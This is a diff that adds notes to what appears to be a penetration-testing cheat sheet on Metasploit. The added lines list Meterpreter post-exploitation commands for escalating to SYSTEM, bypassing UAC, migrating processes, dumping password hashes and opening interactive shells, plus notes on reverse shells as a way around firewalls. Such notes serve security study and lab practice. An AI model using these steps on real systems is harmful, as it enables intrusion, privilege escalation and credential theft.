@@ -153,5 +153,34 @@ http://www.metasploit.com/
   > set <eg LPORT>
   > exploit
   
-
+  > sysinfo
+  > getuid
+  > ifconfig
+  > route
+  > getsystem
+  > ps
+  > getpid
   
+  > run post/windows/gather/win_privs
+  > search bypassuac
+  > exploit
+  > getuid
+  > run post/windows/gather/win_privs
+  > getsystem
+  > ps -U SYSTEM
+  > migrate <PID> 
+  
+  > search hashdump
+  
+  > upload / downlaod       // '\' Characters must be escaped -> eg 'C:\\Windows'
+
+  > shell                   // interactive shell
+  
+  
+Meterpreter:
+------------------
+http://www.monkey.org/~dugsong/dsniff/
+> all possible Meterpreter payloads: search meterpreter
+> set payload [...]/meterpreter/[...]
+> bind shell:     process on server waits for connections of attacker
+> reverse shell:  connects back to the attacker -> firewall rule evasion
